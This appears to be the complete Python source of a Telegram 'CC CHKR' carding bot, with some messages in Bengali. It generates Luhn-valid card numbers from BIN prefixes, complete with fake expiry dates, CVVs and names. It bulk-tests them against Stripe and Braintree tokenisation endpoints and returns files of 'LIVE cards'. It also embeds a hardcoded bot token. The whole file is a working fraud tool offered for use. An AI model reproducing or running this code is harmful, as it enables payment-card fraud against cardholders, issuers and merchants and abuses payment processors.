import telebot, requests, time, re, random, string, json, urllib.request, io, os

TOKEN    = os.environ.get("TOKEN") or "8658349511:AAFckiyww9dQTWLmppYFQD-s3iw5CEWt6t4"
ADMIN_ID = 8107322490

bot = telebot.TeleBot(TOKEN)

NAMES_F = ["JAMES","JOHN","ROBERT","MICHAEL","SARAH",
           "JESSICA","EMILY","AMANDA","DAVID","WILLIAM"]
NAMES_L = ["SMITH","JOHNSON","WILLIAMS","JONES","BROWN",
           "DAVIS","MILLER","WILSON","MOORE","TAYLOR"]

# ── LUHN ──────────────────────────────────────────────────
def luhn_ok(n):
    d = [int(x) for x in n if x.isdigit()]
    d.reverse(); t = 0
    for i, x in enumerate(d):
        if i%2==1: x=x*2-(9 if x*2>9 else 0)
        t += x
    return t%10 == 0

def luhn_complete(p):
    def chk(n):
        d=[int(x) for x in n]; d.reverse(); t=0
        for i,x in enumerate(d):
            if i%2==1: x=x*2-(9 if x*2>9 else 0)
            t+=x
        return t%10
    return p + str((10 - chk(p+"0")) % 10)

# ── PARSE CARD ────────────────────────────────────────────
def parse_card(text):
    text  = text.strip().replace(' ','|').replace('/','|')
    parts = re.split(r'[|/\s]+', text)
    if len(parts) == 4:
        pan, mm, yy, cvv = parts
        yy = yy if len(yy)==4 else f"20{yy}"
        return pan.strip(), mm.strip(), yy.strip(), cvv.strip()
    return None

# ── BIN LOOKUP ────────────────────────────────────────────
def lookup_bin(bin6):
    try:
        url = f"https://lookup.binlist.net/{bin6[:6]}"
        req = urllib.request.Request(url, headers={
            'Accept-Version': '3',
            'User-Agent': 'Mozilla/5.0'
        })
        with urllib.request.urlopen(req, timeout=5) as r:
            data = json.loads(r.read().decode())
        return {
            "network": data.get("scheme","?").upper(),
            "bank":    data.get("bank",{}).get("name","?"),
            "type":    data.get("type","?").upper(),
            "tier":    data.get("brand","?").upper(),
            "country": data.get("country",{}).get("name","?"),
            "emoji":   data.get("country",{}).get("emoji","🌐"),
        }
    except:
        first = {'4':'Visa','5':'Mastercard','3':'Amex','6':'Discover'}
        return {
            "network": first.get(bin6[0],"Unknown"),
            "bank":    "Unknown",
            "type":    "?",
            "tier":    "?",
            "country": "?",
            "emoji":   "🌐",
        }

# ── GEN CARDS ─────────────────────────────────────────────
def gen_cards(bin_prefix, count, info):
    network = info.get("network","Unknown")
    pan_len = 15 if "AMEX" in network else 16
    cards   = []
    for _ in range(count):
        fill = pan_len - len(bin_prefix) - 1
        mid  = ''.join(random.choices(string.digits, k=fill))
        pan  = luhn_complete(bin_prefix + mid)
        yr   = random.randint(25, 29)
        mo   = random.randint(1, 12)
        cvv  = ''.join(random.choices(string.digits,
               k=4 if "AMEX" in network else 3))
        name = f"{random.choice(NAMES_F)} {random.choice(NAMES_L)}"
        cards.append(f"{pan}|{mo:02d}|{yr}|{cvv}|{name}")
    return cards

# ── STRIPE CHECK ──────────────────────────────────────────
def check_stripe(pan, mm, yy, cvv):
    try:
        r = requests.post(
            "https://api.stripe.com/v1/tokens",
            data={
                "card[number]":    pan,
                "card[exp_month]": mm,
                "card[exp_year]":  yy,
                "card[cvc]":       cvv,
            },
            headers={"Authorization":
                     "Bearer pk_live_REPLACE_WITH_YOUR_STRIPE_PK"},
            timeout=10
        )
        d = r.json()
        if "error" in d:
            return "DEAD", d["error"]["message"]
        return "LIVE", "Stripe approved"
    except Exception as e:
        return "ERROR", str(e)

# ── BRAINTREE CHECK ───────────────────────────────────────
def check_braintree(pan, mm, yy, cvv):
    try:
        r = requests.post(
            "https://payments.braintree-api.com/graphql",
            json={
                "query": """
                mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {
                  tokenizeCreditCard(input: $input) {
                    token
                    creditCard { last4 expirationYear expirationMonth }
                  }
                }""",
                "variables": {
                    "input": {
                        "creditCard": {
                            "number":          pan,
                            "expirationMonth": mm,
                            "expirationYear":  yy,
                            "cvv":             cvv
                        }
                    }
                }
            },
            headers={
                "Authorization":     "Bearer sandbox_REPLACE_KEY",
                "Braintree-Version": "2019-01-01",
                "Content-Type":      "application/json"
            },
            timeout=10
        )
        d = r.json()
        token = (d.get("data",{})
                  .get("tokenizeCreditCard",{})
                  .get("token"))
        if token:
            return "LIVE", f"Braintree approved"
        errors = d.get("errors",[{}])
        msg    = errors[0].get("message","declined") if errors else "declined"
        return "DEAD", msg
    except Exception as e:
        return "ERROR", str(e)

# ── PROCESS CARD ──────────────────────────────────────────
def process(m, text, gate="stripe"):
    parsed = parse_card(text)
    if not parsed:
        bot.send_message(m.chat.id,
            "❌ Wrong format\nUse: `4111...|12|25|123`",
            parse_mode="Markdown")
        return
    pan, mm, yy, cvv = parsed
    if not luhn_ok(pan):
        bot.send_message(m.chat.id,
            "❌ *DEAD* — Invalid card number",
            parse_mode="Markdown")
        return
    gate_name = "Braintree" if gate=="braintree" else "Stripe"
    msg = bot.send_message(m.chat.id,
        f"⏳ *Checking {gate_name}...*",
        parse_mode="Markdown")
    if gate == "braintree":
        status, response = check_braintree(pan, mm, yy, cvv)
    else:
        status, response = check_stripe(pan, mm, yy, cvv)
    icon = "✅" if status=="LIVE" else "❌" if status=="DEAD" else "⚠️"
    out = f"""
{icon} *{status}*

💳 `....{pan[-4:]}`
📅 Exp: `{mm}/{yy[-2:]}`
🔐 CVV: `{cvv}`
🏦 Gate: {gate_name}
💬 `{response}`
"""
    bot.edit_message_text(out, m.chat.id,
                          msg.message_id, parse_mode="Markdown")

# ══════════════════════════════════════════════
#  COMMANDS
# ══════════════════════════════════════════════

@bot.message_handler(commands=['start'])
def start(m):
    bot.send_message(m.chat.id, f"""
👋 *CC CHKR Bot*
🆔 Your ID: `{m.from_user.id}`

━━━━━━━━━━━━━━━━━━━
💳 *𝐂𝐇𝐄𝐂𝐊𝐄𝐑*
/chk — 𝐒𝐭𝐫𝐢𝐩𝐞 𝐜𝐡𝐞𝐜𝐤
/chkbt — 𝐁𝐫𝐚𝐢𝐧𝐭𝐫𝐞𝐞 𝐜𝐡𝐞𝐜𝐤
/mass — 𝐁𝐮𝐥𝐤 𝐒𝐭𝐫𝐢𝐩𝐞 𝐜𝐡𝐞𝐜𝐤

━━━━━━━━━━━━━━━━━━━
🎰 *𝐆𝐄𝐍𝐄𝐑𝐀𝐓𝐎𝐑*
/gen 411111 10
/genfile 411111 100

━━━━━━━━━━━━━━━━━━━
🚀 *𝐌𝐔𝐋𝐓𝐈 𝐁𝐈𝐍 𝐆𝐄𝐍+𝐂𝐇𝐄𝐂𝐊*
/gen\\_cc\\_with\\_multiple
/massgen

━━━━━━━━━━━━━━━━━━━
🔍 *𝐁𝐈𝐍 𝐈𝐍𝐅𝐎*
/binfo 411111
/id — Telegram ID
━━━━━━━━━━━━━━━━━━━
""", parse_mode="Markdown")

@bot.message_handler(commands=['id'])
def get_id(m):
    bot.send_message(m.chat.id,
        f"🆔 Your ID: `{m.from_user.id}`",
        parse_mode="Markdown")

@bot.message_handler(commands=['chk'])
def chk(m):
    card = m.text.replace('/chk','').strip()
    if not card:
        bot.send_message(m.chat.id,
            "Usage: `/chk 4111...|12|25|123`",
            parse_mode="Markdown")
        return
    process(m, card, gate="stripe")

@bot.message_handler(commands=['chkbt'])
def chkbt(m):
    card = m.text.replace('/chkbt','').strip()
    if not card:
        bot.send_message(m.chat.id,
            "Usage: `/chkbt 4111...|12|25|123`",
            parse_mode="Markdown")
        return
    process(m, card, gate="braintree")

@bot.message_handler(commands=['mass'])
def mass(m):
    text = m.text.replace('/mass','').strip()
    if not text:
        bot.send_message(m.chat.id,
            "Send cards after /mass one per line")
        return
    lines = [l.strip() for l in text.split('\n') if l.strip()]
    bot.send_message(m.chat.id,
        f"⏳ Checking {len(lines)} cards...")
    live = dead = error = 0
    report = ""
    for line in lines[:30]:
        parsed = parse_card(line)
        if not parsed:
            error += 1
            continue
        pan, mm, yy, cvv = parsed
        if not luhn_ok(pan):
            dead += 1
            report += f"❌ `....{pan[-4:]}` — Luhn fail\n"
            continue
        status, resp = check_stripe(pan, mm, yy, cvv)
        if status == "LIVE":
            live += 1
            report += f"✅ `....{pan[-4:]}` — {resp}\n"
        elif status == "DEAD":
            dead += 1
            report += f"❌ `....{pan[-4:]}` — {resp}\n"
        else:
            error += 1
            report += f"⚠️ `....{pan[-4:]}` — {resp}\n"
        time.sleep(0.5)
    bot.send_message(m.chat.id, f"""
📊 *Mass Check Results*
━━━━━━━━━━━━━━━
✅ Live:  `{live}`
❌ Dead:  `{dead}`
⚠️ Error: `{error}`
━━━━━━━━━━━━━━━
{report}
""", parse_mode="Markdown")

@bot.message_handler(commands=['binfo'])
def binfo_cmd(m):
    parts = m.text.split()
    if len(parts) < 2:
        bot.send_message(m.chat.id,
            "Usage: `/binfo 411111`",
            parse_mode="Markdown")
        return
    bin6 = parts[1].strip()
    msg  = bot.send_message(m.chat.id, "⏳ Looking up...")
    info = lookup_bin(bin6)
    reply = f"""
🔍 *BIN: {bin6}*
━━━━━━━━━━━━━━━
🏦 Bank:    `{info['bank']}`
💳 Network: `{info['network']}`
📋 Type:    `{info['type']}`
⭐ Tier:    `{info['tier']}`
🌍 Country: {info['emoji']} `{info['country']}`
━━━━━━━━━━━━━━━
"""
    bot.edit_message_text(reply, m.chat.id,
                          msg.message_id, parse_mode="Markdown")

@bot.message_handler(commands=['gen'])
def gen_cmd(m):
    parts = m.text.split()
    if len(parts) < 2:
        bot.send_message(m.chat.id,
            "Usage: `/gen 411111 10`",
            parse_mode="Markdown")
        return
    bin6  = parts[1].strip()
    count = int(parts[2]) if len(parts) > 2 else 10
    count = min(count, 50)
    msg   = bot.send_message(m.chat.id, "⏳ Generating...")
    info  = lookup_bin(bin6)
    cards = gen_cards(bin6, count, info)
    header = f"""🎰 *Generated Cards*
━━━━━━━━━━━━━━━
🏦 `{info['bank']}`
💳 {info['network']} | {info['tier']}
🌍 {info['emoji']} {info['country']}
📦 Count: *{count}*
━━━━━━━━━━━━━━━\n\n"""
    body = "\n".join([f"`{c}`" for c in cards])
    bot.edit_message_text(header + body, m.chat.id,
                          msg.message_id, parse_mode="Markdown")

@bot.message_handler(commands=['genfile'])
def genfile_cmd(m):
    parts = m.text.split()
    if len(parts) < 2:
        bot.send_message(m.chat.id,
            "Usage: `/genfile 411111 100`",
            parse_mode="Markdown")
        return
    bin6  = parts[1].strip()
    count = int(parts[2]) if len(parts) > 2 else 50
    count = min(count, 500)
    bot.send_message(m.chat.id,
        f"⏳ Generating {count} cards...")
    info    = lookup_bin(bin6)
    cards   = gen_cards(bin6, count, info)
    content = f"# BIN: {bin6} | {info['network']} | {info['bank']}\n"
    content += f"# Country: {info['country']} | Type: {info['type']}\n\n"
    content += "\n".join(cards)
    f = io.BytesIO(content.encode())
    f.name = f"cards_{bin6}.txt"
    bot.send_document(m.chat.id, f,
        caption=f"✅ *{count} cards* for BIN `{bin6}`\n🏦 {info['bank']}",
        parse_mode="Markdown")

@bot.message_handler(commands=['massgen'])
def massgen_cmd(m):
    text = m.text.replace('/massgen','').strip()
    if not text:
        bot.send_message(m.chat.id, """
📌 *Usage:*
`/massgen`
`411111 10`
`541254 5`
`371449 8`
""", parse_mode="Markdown")
        return
    lines = [l.strip() for l in text.split('\n') if l.strip()]
    bot.send_message(m.chat.id,
        f"⏳ {len(lines)} BIN থেকে generate + check...")
    all_live = []; all_dead = []; all_error = []
    bin_report = ""
    for line in lines[:10]:
        parts = line.split()
        bin6  = parts[0].strip()
        count = int(parts[1]) if len(parts) > 1 else 5
        count = min(count, 20)
        if not bin6.isdigit() or not 4 <= len(bin6) <= 8:
            continue
        info  = lookup_bin(bin6)
        cards = gen_cards(bin6, count, info)
        b_live = b_dead = b_err = 0
        for card in cards:
            p = card.split('|')
            if len(p) < 4: continue
            pan,mm,yy,cvv = p[0],p[1],p[2],p[3]
            yy_f = f"20{yy}" if len(yy)==2 else yy
            status,resp = check_stripe(pan,mm,yy_f,cvv)
            entry = f"{pan}|{mm}|{yy}|{cvv}"
            if status=="LIVE":
                b_live+=1
                all_live.append(f"✅ {entry} | {info['network']} | {resp}")
            elif status=="DEAD":
                b_dead+=1
                all_dead.append(f"❌ {entry} | {resp}")
            else:
                b_err+=1
                all_error.append(f"⚠️ {entry} | {resp}")
            time.sleep(0.3)
        bin_report += (f"📦 `{bin6}` {info['network']} {info['emoji']}\n"
                       f"   ✅{b_live} ❌{b_dead} ⚠️{b_err}\n")
    summary = f"""
📊 *Mass Gen+Check Results*
━━━━━━━━━━━━━━━
✅ Live:  `{len(all_live)}`
❌ Dead:  `{len(all_dead)}`
⚠️ Error: `{len(all_error)}`
━━━━━━━━━━━━━━━
{bin_report}"""
    bot.send_message(m.chat.id, summary, parse_mode="Markdown")
    if all_live:
        f1 = io.BytesIO("\n".join(all_live).encode())
        f1.name = "live_cards.txt"
        bot.send_document(m.chat.id, f1,
            caption=f"🔥 *{len(all_live)} LIVE Cards*",
            parse_mode="Markdown")
    full = ("# LIVE\n" + "\n".join(all_live) +
            "\n\n# DEAD\n" + "\n".join(all_dead) +
            "\n\n# ERROR\n" + "\n".join(all_error))
    f2 = io.BytesIO(full.encode())
    f2.name = "all_results.txt"
    bot.send_document(m.chat.id, f2,
        caption="📁 *Full Results*",
        parse_mode="Markdown")

@bot.message_handler(commands=['gen_cc_with_multiple'])
def gen_cc_multiple(m):
    text = m.text.replace('/gen_cc_with_multiple','').strip()
    if not text:
        bot.send_message(m.chat.id, """
📌 *Usage:*

`/gen_cc_with_multiple`
`411111`
`541254 x 15`
`371449 x 10`
`601100`

BIN শুধু দাও — default 10টা
অথবা `BIN x COUNT` format
""", parse_mode="Markdown")
        return

    raw_lines = [l.strip() for l in text.split('\n') if l.strip()]
    bins_final = []; counts = []

    for line in raw_lines:
        parts = line.lower().replace('x','|').split('|')
        b = parts[0].strip()
        c = int(parts[1].strip()) if len(parts) > 1 else 10
        if b.isdigit() and 4 <= len(b) <= 8:
            bins_final.append(b)
            counts.append(min(c, 30))

    if not bins_final:
        bot.send_message(m.chat.id, "❌ Valid BIN পাইনি")
        return

    total_gen = sum(counts)
    prog = bot.send_message(m.chat.id,
        f"⏳ *{len(bins_final)} BIN* থেকে *{total_gen} card* generate + check...",
        parse_mode="Markdown")

    all_live = []; all_dead = []; all_error = []
    bin_stats = []

    for i, (bin6, count) in enumerate(zip(bins_final, counts)):
        info = lookup_bin(bin6)
        net  = info.get('network','?')
        emj  = info.get('emoji','🌐')
        bank = info.get('bank','?')

        try:
            bot.edit_message_text(
                f"⏳ `{bin6}` check হচ্ছে... ({i+1}/{len(bins_final)})\n"
                f"🏦 {bank} | {net} {emj}",
                m.chat.id, prog.message_id,
                parse_mode="Markdown")
        except:
            pass

        cards  = gen_cards(bin6, count, info)
        b_live = b_dead = b_err = 0

        for card in cards:
            p = card.split('|')
            if len(p) < 4: continue
            pan,mm,yy,cvv = p[0],p[1],p[2],p[3]
            yy_f = f"20{yy}" if len(yy)==2 else yy
            status,resp = check_stripe(pan,mm,yy_f,cvv)
            entry = f"{pan}|{mm}|{yy}|{cvv}"
            if status=="LIVE":
                b_live+=1
                all_live.append(
                    f"✅ {entry} | {net} | {bank} | {resp}")
            elif status=="DEAD":
                b_dead+=1
                all_dead.append(f"❌ {entry} | {resp}")
            else:
                b_err+=1
                all_error.append(f"⚠️ {entry} | {resp}")
            time.sleep(0.3)

        bin_stats.append(
            f"📦 `{bin6}` {net} {emj} `{bank}`\n"
            f"   ✅{b_live}  ❌{b_dead}  ⚠️{b_err}\n")

    stat_text = "".join(bin_stats)
    summary = f"""
🎯 *Multi BIN Gen+Check Complete*
━━━━━━━━━━━━━━━━━━━
🔢 BINs     : `{len(bins_final)}`
📦 Generated: `{total_gen}`
✅ Live     : `{len(all_live)}`
❌ Dead     : `{len(all_dead)}`
⚠️ Error    : `{len(all_error)}`
━━━━━━━━━━━━━━━━━━━
{stat_text}🏦 Gate: Stripe
"""
    try:
        bot.edit_message_text(summary, m.chat.id,
                              prog.message_id, parse_mode="Markdown")
    except:
        bot.send_message(m.chat.id, summary, parse_mode="Markdown")

    if all_live:
        f1 = io.BytesIO("\n".join(all_live).encode())
        f1.name = "live_cards.txt"
        bot.send_document(m.chat.id, f1,
            caption=f"🔥 *{len(all_live)} LIVE Cards Found!*",
            parse_mode="Markdown")

    full = ("# ✅ LIVE\n" + "\n".join(all_live) +
            "\n\n# ❌ DEAD\n" + "\n".join(all_dead) +
            "\n\n# ⚠️ ERROR\n" + "\n".join(all_error))
    f2 = io.BytesIO(full.encode())
    f2.name = "full_results.txt"
    bot.send_document(m.chat.id, f2,
        caption="📁 *Full Results (Live + Dead + Error)*",
        parse_mode="Markdown")

# ── AUTO DETECT ───────────────────────────────────────────
@bot.message_handler(func=lambda m: True)
def auto(m):
    if parse_card(m.text):
        process(m, m.text, gate="stripe")
    else:
        bot.send_message(m.chat.id,
            "❓ /start দেখো commands এর জন্য")

# ── RUN ───────────────────────────────────────────────────
if __name__ == '__main__':
    print("✅ Bot running...")
    bot.infinity_polling(timeout=30, long_polling_timeout=15)
